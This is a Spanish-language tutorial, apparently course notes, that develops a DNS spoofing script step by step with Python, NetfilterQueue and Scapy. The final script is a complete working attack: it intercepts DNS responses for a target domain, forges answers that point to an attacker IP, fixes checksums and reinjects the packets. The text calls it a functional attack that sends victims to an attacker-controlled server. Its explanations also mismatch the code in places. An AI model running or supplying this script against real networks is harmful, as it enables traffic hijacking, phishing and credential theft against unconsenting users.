
---

# Evolución del Script de DNS Spoofing

A lo largo de la creación de un script pasamos por diferentes etapas, cada una agregando una funcionalidad clave para llegar al ataque DNS Spoofing completo. Vamos a analizar cómo ha evolucionado el código paso a paso.

## Primer script: Captura de paquetes (detección inicial)

```python
import netfilterqueue

def process_packet(packet):
    packet.accept()

queue = netfilterqueue.NetfilterQueue()
queue.bind(0, process_packet)
queue.run()
```

**¿Qué hace?**

- Captura paquetes de la cola de Netfilter pero no los analiza ni modifica.
- Simplemente los acepta sin hacer nada.
- Nos sirve como base para entender el funcionamiento de NetfilterQueue y probar que estamos interceptando tráfico correctamente.

---

## Segundo script: Inspección de tráfico (análisis del contenido)

```python
import netfilterqueue
import scapy.all as scapy

def process_packet(packet):
    scapy_packet = scapy.IP(packet.get_payload())
    print(scapy_packet)
    packet.accept()
```

**¿Qué añade?**

- Introduce Scapy para analizar los paquetes capturados.
- Convierte los paquetes en objetos `scapy.IP()` para poder inspeccionarlos.
- Muestra en pantalla cada paquete que pasa por la cola.

**¿Por qué es útil?**

- Nos permite ver qué tipo de tráfico estamos interceptando.
- Sirve para entender qué modificar en los siguientes pasos.

---

## Tercer script: Filtrado de consultas DNS (enfocando el ataque)

```python
import netfilterqueue
import scapy.all as scapy

def process_packet(packet):
    scapy_packet = scapy.IP(packet.get_payload())
    
    if scapy_packet.haslayer(scapy.DNSQR):  # Verifica si es una consulta DNS
        qname = scapy_packet[scapy.DNSQR].qname  # Extrae el dominio consultado
        
        if b"<dominio_ejmplo.com>" in qname:  # Si el dominio es <dominio_ejmplo.com>
            print(f"\n[+] Detectada consulta DNS a <dominio_ejmplo.com>")
            print(scapy_packet.show())  # Muestra el paquete
    
    packet.accept()
```

**¿Qué añade?**

- Filtra solo los paquetes que contienen consultas DNS (`DNSQR`).
- Extrae el nombre del dominio consultado (`qname`).
- Si el dominio es "hack4u.io", imprime un mensaje y muestra el contenido del paquete.

**¿Por qué es útil?**

- Nos permite focalizar el ataque en un dominio específico en lugar de capturar todo el tráfico.
- Es el primer paso para interceptar y luego modificar las respuestas DNS.

---

## Cuarto script: Modificación de respuestas DNS (ataque DNS Spoofing)

```python
#!/usr/bin/env python3

import netfilterqueue  # Importa la librería para manipular la cola de paquetes
import scapy.all as scapy  # Importa Scapy para analizar y modificar paquetes
import signal  # Manejo de señales (ejemplo: Ctrl+C)
import sys  # Permite salir del programa con sys.exit()

# Manejo de la señal SIGINT (Ctrl+C) para salir limpiamente
def def_handler(sig, frame):
    print(f"\n[!] Saliendo...")
    sys.exit(1)

# Asigna la función def_handler a la señal SIGINT
signal.signal(signal.SIGINT, def_handler)

# Función que procesa cada paquete capturado
def process_packet(packet):
    scapy_packet = scapy.IP(packet.get_payload())  # Convierte el paquete en un objeto de Scapy

    # Verifica si el paquete contiene una respuesta DNS
    if scapy_packet.haslayer(scapy.DNSRR):  
        qname = scapy_packet[scapy.DNSQR].qname  # Obtiene el dominio consultado

        # Si el dominio es <dominio_ejmplo.com>, se ejecuta el ataque
        if b"<dominio_ejmplo.com>" in qname:  
            print(f"\n[+] Envenenando el dominio <dominio_ejmplo.com>")

            # Crea una respuesta DNS falsa que redirige a la IP <IP_Atacante>
            answer = scapy.DNSRR(rrname=qname, rdata="<IP_Atacante>")  
            scapy_packet[scapy.DNS].an = answer  # Reemplaza la respuesta DNS original con la falsa
            scapy_packet[scapy.DNS].ancount = 1  # Establece el número de respuestas a 1

            # Borra los campos de longitud y checksum para que Scapy los regenere automáticamente
            del scapy_packet[scapy.IP].len  
            del scapy_packet[scapy.IP].chksum  
            del scapy_packet[scapy.UDP].len  
            del scapy_packet[scapy.UDP].chksum  

            # Reconstruye el paquete y lo inyecta en el flujo de datos
            packet.set_payload(scapy_packet.build())  

    packet.accept()  # Acepta el paquete y lo deja pasar

# Crea la cola de NetfilterQueue y la asocia a la función process_packet
queue = netfilterqueue.NetfilterQueue()
queue.bind(0, process_packet)  # Captura los paquetes de la cola con ID 0
queue.run()  # Inicia el procesamiento de paquetes
```

**¿Qué añade?**

- Modifica las respuestas DNS para redirigir a la IP `<IP_Objetivo>`.
- Inyecta una respuesta falsa (`DNSRR`) con la nueva IP en el paquete DNS.
- Borra checksums y longitudes para evitar errores al reinyectar el paquete en la red.
- Reemplaza el paquete original con el modificado antes de reenviarlo.

---

## Conclusión: ¿Por qué esta evolución?

1. **Captura del tráfico** → Primero aseguramos que los paquetes llegan correctamente.
2. **Análisis del tráfico** → Luego inspeccionamos qué datos contienen los paquetes.
3. **Filtrado de DNS** → Nos enfocamos en capturar solo lo que nos interesa.
4. **Modificación de paquetes** → Finalmente alteramos las respuestas DNS para manipular el tráfico.

Este flujo es necesario para que el ataque sea efectivo. Ahora el script final es un ataque funcional de DNS Spoofing, capaz de redirigir a las víctimas a un servidor controlado por el atacante.

---
